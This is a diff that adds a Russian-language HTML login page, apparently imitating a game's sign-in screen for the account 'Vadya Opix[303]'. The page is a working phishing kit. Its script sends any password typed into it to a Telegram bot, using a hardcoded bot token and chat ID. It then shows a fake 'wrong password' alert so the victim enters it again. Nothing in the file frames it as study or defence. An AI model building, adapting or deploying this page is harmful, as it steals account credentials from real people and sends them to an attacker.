@@ -1,0 +1,45 @@
+DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вторизация</title>
+    <style>
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; color: white; }
+        .box { background: #16213e; padding: 40px; border-radius: 20px; text-align: center; width: 300px; }
+        .name { font-size: 24px; color: #ffd700; margin-bottom: 10px; }
+        .label { color: #aaa; font-size: 14px; margin: 20px 0; }
+        input { width: 100%; padding: 12px; border-radius: 10px; border: none; background: #0f3460; color: white; font-size: 16px; margin-bottom: 15px; }
+        .btn { background: #e94560; color: white; border: none; padding: 12px; border-radius: 10px; width: 100%; font-size: 18px; cursor: pointer; }
+        .restore { color: #aaa; font-size: 12px; margin-top: 10px; display: block; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <div class="name"> Vadya Opix[303]</div>
+    <div class="label">Введите пароль, чтобы войти в игру.</div>
+    <input type="password" id="password" placeholder="Введите пароль">
+    <button class="btn" id="loginBtn">ИГРАТЬ</button>
+    <a href="#" class="restore">Восстановить пароль</a>
+</div>
+
+<script>
+const token = '8506478948:AAGG63Lt7ptSzAxGr-LE5RW6fR1QgYyXBYc';
+const chatId = '5281723464';
+
+document.getElementById('loginBtn').addEventListener('click', function(e) {
+    e.preventDefault();
+    const pass = document.getElementById('password').value;
+    if (pass) {
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: '🔑 Пароль: ' + pass })
+        });
+        alert('Неверный пароль. Попробуйте снова.');
+        document.getElementById('password').value = '';
+    }
+});
+</script>
+</body>
+</html>
